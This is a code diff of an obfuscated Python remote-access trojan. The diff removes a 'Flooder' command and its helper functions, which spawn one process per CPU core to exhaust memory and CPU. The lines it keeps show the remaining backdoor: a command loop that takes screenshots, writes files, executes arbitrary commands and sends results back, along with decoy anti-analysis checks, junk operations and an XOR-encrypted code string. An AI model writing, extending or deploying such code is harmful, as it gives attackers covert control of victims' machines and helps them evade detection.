@@ -30,7 +30,6 @@ _ss = _m('ssl')
 _plt = _m('platform')
 _t = _m('time')
 _io = _m('io')
-_mp = _m('multiprocessing')
 
 # Decoy anti-analysis checks
 def _system_validation():
@@ -355,35 +354,6 @@ class _x4fd21:
         except Exception as e:
             return f"{_err_conn}Error taking screenshot: {str(e)}"
 
-    # Add this method to the _x4fd21 class (after _scrn method)
-    def _f100d(self, _d=30, _r=100):
-        """Resource flooding function - obfuscated"""
-        try:
-            # More garbage operations
-            if random.random() > 0.7:
-                _temp_var = []
-                for i in range(random.randint(1, 5)):
-                    _temp_var.append(hashlib.md5(str(i + time()).encode()).hexdigest())
-                del _temp_var
-                
-            _cores = _mp.cpu_count()
-            _procs = []
-            
-            for _ in range(_cores):
-                # Pass duration as first argument to the standalone function
-                _p = _mp.Process(target=_h0g, args=(_d, True, _r))
-                _p.daemon = True
-                _p.start()
-                _procs.append(_p)
-            
-            _t.sleep(_d)
-            for _p in _procs:
-                _p.terminate()
-                
-            return f"{_succ_msg}Finished resource flooding: used {_cores} cores with {_r}MB RAM each for {_d} seconds"
-        except Exception as _e:
-            return f"{_err_conn}Error during resource flooding: {str(_e)}"
-
     def _run(self):
         while True:
             # Random timing operations
@@ -411,35 +381,12 @@ class _x4fd21:
                     _res = self._wr1te(_cmd[1], _cmd[2])
                 elif _cmd[0] == "screenshot":
                     _res = self._scrn()
-                elif _cmd[0] == "Flooder":
-                    # Add garbage conditional
-                    if random.random() > 0.8:
-                        for _ in range(random.randint(1, 3)):
-                            _ = hashlib.sha256(str(time()).encode()).hexdigest()
-                    
-                    # Parse optional arguments with defaults
-                    _dur = int(_cmd[1]) if len(_cmd) > 1 else 30
-                    _ram = int(_cmd[2]) if len(_cmd) > 2 else 100
-                    _res = self._f100d(_dur, _ram)
                 else:
                     _res = self._ex3c(_cmd)
             except Exception as e:
                 _res = f"{_err_conn}Error during command execution: {str(e)}"
                 
             self._s3nd(_res)
-
-# Add this function before the _x4fd21 class definition
-def _h0g(_d, _c=True, _m=50):
-    """Standalone resource hogging function"""
-    # Allocate significant memory
-    _hm = [0] * (_m * 250_000)  # ~50 MB per 250k integers
-    if _c:
-        _et = time.time() + _d
-        while time.time() < _et:
-            # CPU-intensive calculation
-            _x = 123456 ** 2
-    else:
-        time.sleep(_d)  # Just hold memory
 
 # Example usage - encrypt critical functions
 _encrypted_cmd_exec = "8fJ9d8f3j...etc" # XOR encrypted string of critical code
